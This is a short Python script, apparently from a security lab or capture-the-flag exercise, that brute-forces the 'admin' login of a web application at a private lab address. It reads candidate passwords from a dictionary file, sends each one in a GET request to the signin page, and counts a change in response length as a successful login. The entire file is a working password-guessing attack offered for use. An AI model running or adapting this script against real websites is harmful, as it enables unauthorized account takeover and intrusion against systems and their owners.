import requests
import urllib.parse

def read_file(path: str):
    with open(path, 'r') as file:
        lines = []

        for line in file:
            lines.append(line.strip())

    return lines

def try_authentication(wrong_request_length: int, username: str, password: str):
    print(f"[username: {username}] [password: {password}] => ", end="", flush=True)
    params = {
        'page': 'signin',
        'username': username,
        'password': password,
        'Login': 'Login'
    }

    encoded_params = urllib.parse.urlencode(params)

    url = 'http://192.168.56.2/?{}'.format(encoded_params)

    response = requests.get(url)
    success = len(response.text) != wrong_request_length
    print(success)

    return success, response.text

def main():
    print("=== Brute forcing website ===")
    username = "admin"
    file = "dictionary.txt"
    wrong_request_length = 1988
    passwords = read_file(file)

    for password in passwords:
        success, response = try_authentication(wrong_request_length, username, password)

        if success:
            print(response)
            return

    print(f"Password for username {username} is not in list.")

if __name__ == "__main__":
    main()